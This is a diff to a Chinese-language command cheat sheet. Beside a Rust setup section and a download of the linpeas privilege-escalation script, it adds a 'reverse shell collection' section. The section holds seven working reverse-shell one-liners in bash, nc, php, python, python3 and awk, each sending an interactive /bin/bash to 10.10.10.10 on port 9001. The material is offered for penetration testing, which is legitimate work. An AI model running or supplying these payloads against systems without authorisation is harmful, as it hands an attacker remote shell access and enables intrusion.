@@ -26,6 +26,7 @@ instruction
    * [Linux安装Rust环境](#linux安装rust环境)
  * [渗透测试](#渗透测试)
    * [Linpeas.sh枚举提权信息](#linpeassh枚举提权信息)
+   * [反弹shell合集](#反弹shell合集)
 
 <!-- 列表头 -->
 ## Rust
@@ -54,6 +55,36 @@ python -c "import urllib.request; urllib.request.urlretrieve('https://github.com
 > **python3**
 ```bash
 python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
+```
+--- 
+
+### 反弹shell合集
+> ***2024-6-25: fb0sh***
+> **bash**
+```bash
+/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
+```
+> **nc**
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
+```
+```bash
+nc 10.10.10.10 9001 -e /bin/bash
+```
+> **php**
+```php
+php -r '$sock=fsockopen("10.10.10.10",9001);popen("/bin/bash <&3 >&3 2>&3", "r");'
+```
+> **python**
+```python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+```python3
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.10.10",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+```
+> **awk**
+```bash
+awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/9001"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
 --- 
 
